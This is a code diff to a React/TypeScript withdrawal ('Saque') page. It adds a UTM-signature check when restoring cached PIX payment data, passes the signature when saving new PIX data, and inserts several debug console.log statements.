@@ -17,7 +17,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
 import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
 import { fbEvents } from "@/lib/fbPixel";
-import { getStoredUtmParams } from "@/hooks/useUtmTracking";
+import { getStoredUtmParams, getUtmSignature } from "@/hooks/useUtmTracking";
 
 interface PixData {
   code: string;
@@ -62,9 +62,14 @@ const Saque = () => {
     // Save session
     saveSession({ cpfData, currentStep: "/saque", valorBeneficio, protocolo });
 
-    // Check for existing valid PIX
-    const storedPix = getStoredPixData(pixStorageKey);
+    // Get current UTM signature for PIX validation
+    const currentUtmSignature = getUtmSignature();
+    console.log('[Saque] Current UTM signature:', currentUtmSignature);
+
+    // Check for existing valid PIX (with UTM signature validation)
+    const storedPix = getStoredPixData(pixStorageKey, currentUtmSignature);
     if (storedPix) {
+      console.log('[Saque] Restoring saved PIX');
       setPixData({
         code: storedPix.code,
         qrcode_base64: storedPix.qrcode_base64,
@@ -77,6 +82,8 @@ const Saque = () => {
       return;
     }
 
+    console.log('[Saque] No valid PIX found, generating new one');
+
     const generatePix = async () => {
       try {
         setIsLoadingPix(true);
@@ -88,6 +95,10 @@ const Saque = () => {
 
         // Get UTM params from localStorage (captured on entry)
         const utmParams = getStoredUtmParams();
+        const utmSignature = getUtmSignature();
+        
+        console.log('[Saque] UTM params for create-pix:', utmParams);
+        console.log('[Saque] UTM signature:', utmSignature);
 
         const response = await supabase.functions.invoke('create-pix', {
           body: {
@@ -132,8 +143,8 @@ const Saque = () => {
           };
           setPixData(newPixData);
           
-          // Save to localStorage for persistence
-          savePixData(pixStorageKey, newPixData);
+          // Save to localStorage for persistence (with UTM signature)
+          savePixData(pixStorageKey, newPixData, utmSignature);
 
           // Start polling for payment status
           startPaymentCheck(externalId);
